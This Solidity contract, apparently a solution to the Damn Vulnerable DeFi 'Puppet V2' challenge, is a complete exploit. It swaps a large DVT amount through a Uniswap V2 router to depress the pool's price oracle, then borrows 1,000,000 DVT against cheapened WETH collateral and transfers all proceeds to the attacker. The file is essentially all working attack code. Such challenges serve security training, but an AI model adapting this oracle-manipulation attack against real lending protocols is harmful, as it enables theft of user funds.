// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function borrow(uint256 amount) external;
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface IUniswapV2Router {
    function WETH() external pure returns (address);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract AttackPuppetV2 {

    address private immutable player;
    IPool private immutable pool;
    IUniswapV2Router private immutable router;
    IERC20 private immutable token;
    IWETH private immutable weth;


    uint private constant DUMP_DVT_AMOUNT = 10_000 ether;
    uint private constant BORROW_DVT_AMOUNT = 1_000_000 ether;

    constructor (
        address _pool,
        address _router,
        address _token
    ) {
        player = msg.sender;
        pool = IPool(_pool);
        router = IUniswapV2Router(_router);
        token = IERC20(_token);
        weth = IWETH(router.WETH());
    }

    function attack() public payable {
        require(msg.sender == player);
        // Swap 10k DVT to WETH

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(router), DUMP_DVT_AMOUNT);
        router.swapExactTokensForTokens(
            DUMP_DVT_AMOUNT,
            9 ether,
            path,
            address(this),
            block.timestamp + 1 days
        );

        // Convert ETH to WETH
        weth.deposit{value: address(this).balance}();

        // Approve the pool to spend WETH
        weth.approve(address(pool), weth.balanceOf(address(this)));
        pool.borrow(BORROW_DVT_AMOUNT);

        // Send all DVT tokens and WETH to player
        token.transfer(player, token.balanceOf(address(this)));
        weth.transfer(player, weth.balanceOf(address(this)));

    }

    receive() external payable {}
}